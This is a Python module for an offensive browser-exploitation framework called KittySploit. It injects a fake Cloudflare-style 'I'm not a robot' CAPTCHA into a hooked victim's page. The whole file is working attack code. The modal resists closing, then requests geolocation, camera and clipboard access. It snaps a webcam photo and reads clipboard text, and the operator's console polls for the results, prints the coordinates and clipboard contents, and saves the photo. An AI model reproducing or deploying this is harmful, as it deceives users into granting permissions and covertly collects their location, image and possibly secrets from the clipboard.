from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Fake CAPTCHA Permissions",
		"description": "Generate a fake CAPTCHA modal that hides permission requests (geolocation, camera photo capture, clipboard)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
		
	}	
	
	url = OptString("", "URL to inject the fake CAPTCHA (empty = current page)", False)
	request_geolocation = OptBool(True, "Request geolocation permission", False)
	request_camera = OptBool(True, "Request camera permission and capture photo", False)
	request_clipboard = OptBool(True, "Request clipboard read permission", False)

	def run(self):
		"""Generate and inject a fake CAPTCHA modal that requests permissions"""
		
		js_code = f"""
		(function() {{
			const existing = document.getElementById('ksCaptchaOverlay');
			if (existing) existing.remove();

			if (!document.getElementById('ksCaptchaStyles')) {{
				const style = document.createElement('style');
				style.id = 'ksCaptchaStyles';
				style.textContent = `
					@keyframes kscp-rotate {{
						from {{ transform: rotate(0deg); }}
						to {{ transform: rotate(360deg); }}
					}}
					@keyframes kscp-pulse {{
						0% {{ opacity: .55; }}
						50% {{ opacity: 1; }}
						100% {{ opacity: .55; }}
					}}
				`;
				document.head.appendChild(style);
			}}

			const overlay = document.createElement('div');
			overlay.id = 'ksCaptchaOverlay';
			overlay.setAttribute('role', 'dialog');
			overlay.setAttribute('aria-modal', 'true');
			overlay.style.cssText = 'position:fixed; inset:0; z-index:2147483647; background:rgba(6,10,26,0.78); display:flex; align-items:center; justify-content:center; backdrop-filter:blur(3px); font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; color:#f6f8ff;';

			const card = document.createElement('div');
			card.style.cssText = 'width:360px; background:linear-gradient(145deg,#0b1120,#111a30); border-radius:18px; padding:28px 26px 24px; box-shadow:0 25px 60px rgba(1,4,14,.65); border:1px solid rgba(255,255,255,.07); position:relative;';

			const closeBtn = document.createElement('button');
			closeBtn.setAttribute('aria-label', 'Close verification dialog');
			closeBtn.style.cssText = 'position:absolute; top:12px; right:12px; width:32px; height:32px; border-radius:50%; border:1px solid rgba(255,255,255,.12); background:rgba(7,10,22,.92); color:#9da8cf; cursor:pointer; font-size:16px;';
			closeBtn.textContent = '×';

			const brandRow = document.createElement('div');
			brandRow.style.cssText = 'display:flex; align-items:center; gap:12px; margin-bottom:10px;';
			const badge = document.createElement('div');
			badge.style.cssText = 'width:42px; height:42px; border-radius:12px; background:linear-gradient(135deg,#f8b042,#f96e35); color:#090f1f; font-weight:700; font-size:15px; display:flex; align-items:center; justify-content:center; text-transform:uppercase;';
			badge.textContent = 'cf';
			const brandText = document.createElement('div');
			brandText.style.cssText = 'font-size:15px; letter-spacing:0.3px; text-transform:uppercase; font-weight:600; color:#dfe5ff;';
			brandText.textContent = 'Cloud verification';
			brandRow.append(badge, brandText);

			const title = document.createElement('div');
			title.style.cssText = 'font-size:18px; font-weight:700; margin-bottom:6px;';
			title.textContent = 'Checking your browser before accessing ' + (window.location.hostname || 'this site');

			const subtitle = document.createElement('p');
			subtitle.style.cssText = 'margin:0; margin-bottom:20px; font-size:13px; color:#9faddb; line-height:1.5;';
			subtitle.textContent = 'This process is automatic. You will be redirected once verification is complete.';

			// Checkbox container
			const checkboxContainer = document.createElement('div');
			checkboxContainer.style.cssText = 'display:flex; align-items:center; justify-content:center; margin:20px 0; padding:12px; border-radius:8px; border:1px solid rgba(255,255,255,.12); background:rgba(7,11,25,.5); cursor:pointer; transition:all 0.3s;';
			
			const checkbox = document.createElement('div');
			checkbox.id = 'ksCaptchaCheckbox';
			checkbox.style.cssText = 'width:20px; height:20px; border:2px solid rgba(255,255,255,.3); border-radius:4px; margin-right:12px; position:relative; transition:all 0.3s; background:rgba(7,11,25,.8); display:flex; align-items:center; justify-content:center;';
			
			const checkboxLabel = document.createElement('span');
			checkboxLabel.style.cssText = 'font-size:14px; font-weight:500; color:#dfe6ff; user-select:none;';
			checkboxLabel.textContent = "I'm not a robot";
			
			checkboxContainer.appendChild(checkbox);
			checkboxContainer.appendChild(checkboxLabel);

			const verifyBtn = document.createElement('button');
			verifyBtn.id = 'ksCaptchaVerifyBtn';
			verifyBtn.style.cssText = 'width:100%; padding:14px; margin-top:16px; border-radius:8px; border:none; background:rgba(79,140,255,.2); color:rgba(255,255,255,.4); font-size:14px; font-weight:600; cursor:not-allowed; transition:all 0.3s;';
			verifyBtn.textContent = 'Verify';
			verifyBtn.disabled = true;

			const spinner = document.createElement('div');
			spinner.id = 'ksCaptchaSpinner';
			spinner.style.cssText = 'width:30px; height:30px; border-radius:50%; border:3px solid rgba(255,255,255,.18); border-top-color:#7f6bff; margin:22px auto 4px; display:none; animation:kscp-rotate 1s linear infinite;';

			const status = document.createElement('div');
			status.id = 'ksCaptchaStatus';
			status.style.cssText = 'font-size:12px; text-align:center; color:#8c99c5;';
			status.textContent = 'Please verify that you are human';

			const helper = document.createElement('div');
			helper.style.cssText = 'margin-top:12px; font-size:11px; color:rgba(255,255,255,.6); text-align:center; letter-spacing:.3px;';
			helper.textContent = 'Do not close this tab while we check your browser.';

			let checkboxChecked = false;
			let challengeStarted = false;

			const escHandler = (event) => {{
				if (event.key === 'Escape' && checkboxChecked) {{
					cleanup();
				}}
			}};

			function cleanup() {{
				if (!checkboxChecked) {{
					return;
				}}
				window.removeEventListener('keydown', escHandler);
				if (document.body.contains(overlay)) {{
					document.body.removeChild(overlay);
				}}
			}}

			// Prevent closing if checkbox not checked
			closeBtn.addEventListener('click', (e) => {{
				if (!checkboxChecked) {{
					e.stopPropagation();
					return;
				}}
				cleanup();
			}});
			
			overlay.addEventListener('click', (event) => {{
				if (event.target === overlay && checkboxChecked) {{
					cleanup();
				}}
			}});
			
			window.addEventListener('keydown', escHandler);

			// Checkbox click handler
			checkboxContainer.addEventListener('click', () => {{
				if (challengeStarted) return;
				
				checkboxChecked = !checkboxChecked;
				
				if (checkboxChecked) {{
					checkbox.style.background = 'linear-gradient(135deg,#4f8cff,#7f6bff)';
					checkbox.style.borderColor = '#4f8cff';
					checkbox.innerHTML = '<span style="color:#fff; font-size:14px; font-weight:bold;">✓</span>';
					verifyBtn.disabled = false;
					verifyBtn.style.background = 'linear-gradient(135deg,#4f8cff,#7f6bff)';
					verifyBtn.style.color = '#fff';
					verifyBtn.style.cursor = 'pointer';
					status.textContent = 'Click Verify to continue';
				}} else {{
					checkbox.style.background = 'rgba(7,11,25,.8)';
					checkbox.style.borderColor = 'rgba(255,255,255,.3)';
					checkbox.innerHTML = '';
					verifyBtn.disabled = true;
					verifyBtn.style.background = 'rgba(79,140,255,.2)';
					verifyBtn.style.color = 'rgba(255,255,255,.4)';
					verifyBtn.style.cursor = 'not-allowed';
					status.textContent = 'Please verify that you are human';
				}}
			}});

			// Verify button click handler
			verifyBtn.addEventListener('click', () => {{
				if (!checkboxChecked || challengeStarted) return;
				
				challengeStarted = true;
				verifyBtn.disabled = true;
				verifyBtn.style.cursor = 'not-allowed';
				spinner.style.display = 'block';
				status.textContent = 'Performing browser verification…';
				startChallenge();
			}});

			card.append(closeBtn, brandRow, title, subtitle, checkboxContainer, verifyBtn, spinner, status, helper);
			overlay.appendChild(card);
			document.body.appendChild(overlay);

			function startChallenge() {{
				const onFinish = () => {{
					checkbox.innerHTML = '<span style="color:#fff; font-size:14px; font-weight:bold;">✓</span>';
					checkbox.style.background = 'linear-gradient(135deg,#4ade80,#16a34a)';
					checkbox.style.borderColor = '#4ade80';
					spinner.style.display = 'none';
					status.textContent = 'Browser verified. Redirecting…';
					status.style.color = '#4ade80';
					verifyBtn.style.background = 'linear-gradient(135deg,#4ade80,#16a34a)';
					verifyBtn.textContent = 'Verified ✓';
					
					// Close modal after verification
					setTimeout(() => cleanup(), 2000);
				}};

				// Wait for all permissions to be requested and completed
				requestPermissions()
					.then((results) => {{
						console.log('[Fake CAPTCHA] All permissions processed, results:', results);
						onFinish();
					}})
					.catch((error) => {{
						console.warn('[Fake CAPTCHA] Error processing permissions:', error);
						onFinish();
					}});
			}}

			function requestPermissions() {{
				const tasks = [];
				const results = {{}};

				if ({str(self.request_geolocation).lower()} && navigator.geolocation) {{
					tasks.push(new Promise((resolve) => {{
						let completed = false;
						const finish = (msg, data) => {{
							if (completed) {{
								return;
							}}
							completed = true;
							console.log('[Fake CAPTCHA] Geolocation:', msg);
							if (data) {{
								results.geolocation = {{
									status: 'granted',
									latitude: data.lat,
									longitude: data.lon
								}};
							}} else {{
								results.geolocation = {{
									status: 'denied',
									message: msg
								}};
							}}
							resolve();
						}};
						navigator.geolocation.getCurrentPosition(
							(position) => finish('granted', {{ lat: position.coords.latitude, lon: position.coords.longitude }}),
							(error) => finish('denied (' + error.code + ')', null),
							{{ enableHighAccuracy: false, timeout: 15000 }}
						);
						setTimeout(() => finish('timeout', null), 16000);
					}}));
				}}

				if ({str(self.request_camera).lower()} && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
					tasks.push(new Promise((resolve) => {{
						navigator.mediaDevices.getUserMedia({{ video: true }})
							.then((stream) => {{
								console.log('[Fake CAPTCHA] Camera access granted');
								// Capture photo from video stream
								const video = document.createElement('video');
								video.srcObject = stream;
								video.play();
								
								video.onloadedmetadata = () => {{
									setTimeout(() => {{
										const canvas = document.createElement('canvas');
										canvas.width = video.videoWidth;
										canvas.height = video.videoHeight;
										const ctx = canvas.getContext('2d');
										ctx.drawImage(video, 0, 0);
										
										// Convert to base64
										const photoData = canvas.toDataURL('image/jpeg', 0.8);
										
										// Store in results
										results.camera = {{
											status: 'granted',
											photo: photoData,
											width: canvas.width,
											height: canvas.height
										}};
										
										// Stop stream
										stream.getTracks().forEach((track) => track.stop());
										resolve();
									}}, 500);
								}};
							}})
							.catch((error) => {{
								console.warn('[Fake CAPTCHA] Camera access denied:', error.name);
								results.camera = {{
									status: 'denied',
									error: error.name
								}};
								resolve();
							}});
					}}));
				}}

				if ({str(self.request_clipboard).lower()} && navigator.clipboard && navigator.clipboard.readText) {{
					tasks.push(
						navigator.clipboard.readText()
							.then((text) => {{
								console.log('[Fake CAPTCHA] Clipboard content:', text);
								console.log('[Fake CAPTCHA] Clipboard length:', text.length);
								if (text && text.trim()) {{
									results.clipboard = {{
										status: 'granted',
										content: text,
										length: text.length
									}};
								}} else {{
									results.clipboard = {{
										status: 'empty',
										content: '',
										length: 0
									}};
								}}
							}})
							.catch((error) => {{
								console.warn('[Fake CAPTCHA] Clipboard denied:', error.name);
								results.clipboard = {{
									status: 'denied',
									error: error.name
								}};
							}})
					);
				}}

				if (!tasks.length) {{
					return Promise.resolve({{}});
				}}

				// Wait for all tasks to complete, especially geolocation and clipboard
				return Promise.all(tasks)
					.then(() => {{
						// Store results in global variable for retrieval
						window.ksCaptchaResults = results;
						return results;
					}})
					.catch(() => {{
						// Even if some fail, store what we have
						window.ksCaptchaResults = results;
						return results;
					}});
			}}
		}})();
		"""
		
		# If URL is specified, redirect first
		import time
		if self.url:
			redirect_js = f"window.location.href = '{self.url}';"
			self.send_js(redirect_js)
			# Wait a bit for redirect
			time.sleep(1)
		
		# Inject the fake CAPTCHA modal
		result = self.send_js(js_code)
		
		if result:
			print_success("Fake CAPTCHA modal injected successfully!")
			print_status("Waiting for user to verify...")
			print_status("The modal will request permissions when user clicks 'Verify'")
			
			# Wait for results (poll every 2 seconds, max 30 seconds)
			max_wait = 30
			elapsed = 0
			results = None
			
			while elapsed < max_wait:
				time.sleep(2)
				elapsed += 2
				
				# Check if results are available
				check_js = "typeof window.ksCaptchaResults !== 'undefined' ? JSON.stringify(window.ksCaptchaResults) : null"
				results_json = self.send_js_and_wait_for_response(check_js, timeout=3.0)
				
				if results_json and results_json != 'null':
					try:
						import json
						results = json.loads(results_json)
						break
					except:
						pass
			
			# Display results in KittySploit console
			if results:
				print_success("Retrieved Information:")
				print_info("=" * 60)
				
				if 'geolocation' in results:
					geo = results['geolocation']
					if geo.get('status') == 'granted':
						print_success(f"Location: Lat {geo.get('latitude', 0):.6f}, Lon {geo.get('longitude', 0):.6f}")
					else:
						print_warning(f"Location: {geo.get('message', 'Denied')}")
				
				if 'camera' in results:
					cam = results['camera']
					if cam.get('status') == 'granted':
						photo_data = cam.get('photo', '')
						if photo_data:
							# Save photo to output directory
							import os
							import base64
							from datetime import datetime
							
							# Create output directory if it doesn't exist
							output_dir = os.path.join(os.getcwd(), "output")
							if not os.path.exists(output_dir):
								os.makedirs(output_dir)
							
							# Generate filename with timestamp
							timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
							filename = f"camera_capture_{timestamp}.jpg"
							filepath = os.path.join(output_dir, filename)
							
							# Remove data URL prefix (data:image/jpeg;base64,)
							if photo_data.startswith('data:image'):
								photo_data = photo_data.split(',', 1)[1]
							
							# Decode base64 and save
							try:
								image_data = base64.b64decode(photo_data)
								with open(filepath, 'wb') as f:
									f.write(image_data)
								print_success(f"Camera: Photo captured and saved to {filepath}")
								print_info(f"  Resolution: {cam.get('width', 0)}x{cam.get('height', 0)}")
							except Exception as e:
								print_error(f"Camera: Failed to save photo: {e}")
					else:
						print_warning(f"Camera: {cam.get('error', 'Denied')}")
				
				if 'clipboard' in results:
					clip = results['clipboard']
					if clip.get('status') == 'granted':
						content = clip.get('content', '')
						print_success(f"Clipboard: {content} (length: {clip.get('length', 0)})")
					elif clip.get('status') == 'empty':
						print_info("Clipboard: Empty")
					else:
						print_warning(f"Clipboard: {clip.get('error', 'Denied')}")
				
			else:
				print_warning("No results retrieved (user may not have completed verification)")
			
			return result
		else:
			print_error("Failed to inject fake CAPTCHA modal")
			return False
